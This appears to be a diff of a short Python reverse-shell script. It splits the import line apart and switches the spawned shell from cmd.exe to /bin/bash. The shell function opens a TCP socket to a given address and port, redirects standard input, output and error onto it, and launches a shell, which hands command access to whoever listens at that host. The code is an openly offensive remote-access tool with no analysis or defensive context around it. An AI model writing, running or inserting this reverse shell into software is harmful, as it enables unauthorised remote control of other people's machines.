@@ -1,4 +1,7 @@
-import subprocess, os, sys, socket
+import subprocess
+import os
+import sys
+import socket
 
 def shell(addr, port):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -6,7 +9,7 @@ def shell(addr, port):
 	os.dup2(sock.fileno(), 0)
 	os.dup2(sock.fileno(), 1)
 	os.dup2(sock.fileno(), 2)
-	subprocess.call(["cmd.exe"])
+	subprocess.call(["/bin/bash"])
 	sock.close()
 	
 def main():
